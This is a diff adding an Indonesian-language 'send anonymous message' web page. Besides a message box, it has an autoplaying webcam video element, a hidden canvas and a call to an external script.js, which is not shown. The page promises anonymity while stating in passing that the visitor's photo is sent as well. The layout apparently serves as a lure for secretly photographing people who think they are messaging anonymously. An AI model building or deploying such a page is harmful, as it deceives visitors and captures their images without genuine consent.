@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Kirim Pesan Anonim</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f4f4f4;
+      padding: 20px;
+      text-align: center;
+    }
+    textarea {
+      width: 90%;
+      height: 100px;
+      padding: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-weight: bold;
+    }
+    #video {
+      width: 250px;
+      margin-top: 10px;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <h1>💬 Kirim Pesan Anonim</h1>
+  <p>Isi pesanmu dan kami akan mengirimkannya ke admin secara anonim + fotomu 📸</p>
+  <textarea id="pesan" placeholder="Ketik pesanmu di sini..."></textarea><br>
+  <br><video id="video" autoplay playsinline></video><br><br>
+  <button onclick="kirim()">Kirim Sekarang</button>
+
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script src="script.js"></script>
+</body>
+</html>
